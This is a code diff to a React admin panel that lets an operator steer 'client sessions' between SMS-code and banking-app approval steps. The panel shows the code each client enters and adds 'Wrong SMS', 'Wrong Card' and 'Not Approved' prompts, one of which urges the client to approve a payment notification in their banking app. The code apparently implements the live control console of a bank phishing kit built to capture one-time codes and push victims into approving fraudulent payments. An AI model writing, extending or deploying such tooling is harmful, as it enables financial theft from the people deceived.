@@ -350,6 +350,80 @@ const AdminPanel = () => {
     }
   };
 
+  const sendToSmsVerification = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 3,
+        approval_type: null,
+        verification_code: null
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending to SMS:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send client to SMS verification",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Client Sent to SMS",
+        description: "Client is now on SMS verification page",
+      });
+    }
+  };
+
+  const sendToAppApproval = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 3,
+        approval_type: "app_pending",
+        verification_code: null
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending to app approval:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send client to app approval",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Client Sent to App Approval",
+        description: "Client is now on bank app approval page",
+      });
+    }
+  };
+
+  const sendNotApprovedMessage = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "The payment has not been approved yet. Please open your banking app and approve the payment notification, then try again.",
+        message_type: "error"
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending message:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send message",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Message Sent",
+        description: "Not approved alert sent to client",
+      });
+    }
+  };
+
   const sendMessage = async (sessionId: string) => {
     const input = messageInputs[sessionId];
     if (!input?.message || !input?.type) {
@@ -695,74 +769,115 @@ const AdminPanel = () => {
 
                       {/* Verification Controls - Only show when on verification step */}
                       {session.current_step === 3 && (
-                        <div className="space-y-2 pt-2 border-t">
-                          <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
-                            Verification Controls:
-                          </p>
-                          <div className="grid grid-cols-2 gap-2">
+                        <div className="space-y-3 pt-2 border-t">
+                          {/* Mode Switcher */}
+                          <div className="flex gap-2">
                             <Button
-                              variant="outline"
+                              variant={session.approval_type !== "app_pending" ? "default" : "outline"}
                               size="sm"
-                              className="gap-2"
-                              onClick={() => resendVerificationCode(session)}
+                              className="flex-1 gap-2"
+                              onClick={() => sendToSmsVerification(session.id)}
                             >
-                              <KeyRound className="w-4 h-4" />
-                              Resend Code
+                              <MessageCircle className="w-4 h-4" />
+                              SMS Mode
                             </Button>
                             <Button
-                              variant="outline"
+                              variant={session.approval_type === "app_pending" ? "default" : "outline"}
                               size="sm"
-                              className="gap-2 text-destructive border-destructive hover:bg-destructive hover:text-destructive-foreground"
-                              onClick={() => sendWrongSmsMessage(session.id)}
-                            >
-                              <XCircle className="w-4 h-4" />
-                              Wrong SMS
-                            </Button>
-                          </div>
-                          <div className="grid grid-cols-2 gap-2">
-                            <Button
-                              variant="outline"
-                              size="sm"
-                              className="gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
-                              onClick={() => sendWrongCardMessage(session.id)}
-                            >
-                              <CreditCard className="w-4 h-4" />
-                              Wrong Card
-                            </Button>
-                            <Button
-                              variant="outline"
-                              size="sm"
-                              className="gap-2 text-purple-600 border-purple-500 hover:bg-purple-500 hover:text-white"
-                              onClick={() => sendRequestPushMessage(session.id)}
+                              className="flex-1 gap-2"
+                              onClick={() => sendToAppApproval(session.id)}
                             >
                               <Smartphone className="w-4 h-4" />
-                              Request Push
+                              App Mode
                             </Button>
                           </div>
-                          {session.verification_code && (
-                            <div className="p-2 rounded bg-muted text-center">
-                              <span className="text-xs text-muted-foreground">Current Code: </span>
-                              <span className="font-mono font-bold">{session.verification_code}</span>
-                            </div>
+
+                          {/* SMS Mode Controls */}
+                          {session.approval_type !== "app_pending" && (
+                            <>
+                              <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                                SMS Controls:
+                              </p>
+                              <div className="grid grid-cols-2 gap-2">
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  className="gap-2 text-destructive border-destructive hover:bg-destructive hover:text-destructive-foreground"
+                                  onClick={() => sendWrongSmsMessage(session.id)}
+                                >
+                                  <XCircle className="w-4 h-4" />
+                                  Wrong SMS
+                                </Button>
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  className="gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
+                                  onClick={() => sendWrongCardMessage(session.id)}
+                                >
+                                  <CreditCard className="w-4 h-4" />
+                                  Wrong Card
+                                </Button>
+                              </div>
+                              {session.verification_code && (
+                                <div className="p-2 rounded bg-muted text-center">
+                                  <span className="text-xs text-muted-foreground">SMS Code: </span>
+                                  <span className="font-mono font-bold">{session.verification_code}</span>
+                                </div>
+                              )}
+                              <Button
+                                size="sm"
+                                className="w-full gap-2 bg-green-600 hover:bg-green-700 text-white"
+                                onClick={() => confirmPayment(session)}
+                              >
+                                <CheckCircle className="w-4 h-4" />
+                                Confirm Payment (SMS)
+                              </Button>
+                            </>
                           )}
-                          <div className="grid grid-cols-2 gap-2">
-                            <Button
-                              size="sm"
-                              className="gap-2 bg-green-600 hover:bg-green-700 text-white"
-                              onClick={() => confirmPayment(session)}
-                            >
-                              <CheckCircle className="w-4 h-4" />
-                              Confirm SMS
-                            </Button>
-                            <Button
-                              size="sm"
-                              className="gap-2 bg-blue-600 hover:bg-blue-700 text-white"
-                              onClick={() => approvePayment(session)}
-                            >
-                              <CheckCircle className="w-4 h-4" />
-                              Approve (App)
-                            </Button>
-                          </div>
+
+                          {/* App Mode Controls */}
+                          {session.approval_type === "app_pending" && (
+                            <>
+                              <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                                App Approval Controls:
+                              </p>
+                              <Button
+                                variant="outline"
+                                size="sm"
+                                className="w-full gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
+                                onClick={() => sendWrongCardMessage(session.id)}
+                              >
+                                <CreditCard className="w-4 h-4" />
+                                Wrong Card
+                              </Button>
+                              {session.verification_code === "APP_APPROVED_CLAIMED" && (
+                                <div className="p-2 rounded bg-blue-500/10 border border-blue-500/30 text-center">
+                                  <span className="text-sm font-medium text-blue-600">
+                                    ✓ Client clicked "I Approved"
+                                  </span>
+                                </div>
+                              )}
+                              <div className="grid grid-cols-2 gap-2">
+                                <Button
+                                  variant="outline"
+                                  size="sm"
+                                  className="gap-2 text-destructive border-destructive hover:bg-destructive hover:text-destructive-foreground"
+                                  onClick={() => sendNotApprovedMessage(session.id)}
+                                >
+                                  <XCircle className="w-4 h-4" />
+                                  Not Approved
+                                </Button>
+                                <Button
+                                  size="sm"
+                                  className="gap-2 bg-green-600 hover:bg-green-700 text-white"
+                                  onClick={() => approvePayment(session)}
+                                >
+                                  <CheckCircle className="w-4 h-4" />
+                                  Confirm (App)
+                                </Button>
+                              </div>
+                            </>
+                          )}
                         </div>
                       )}
 
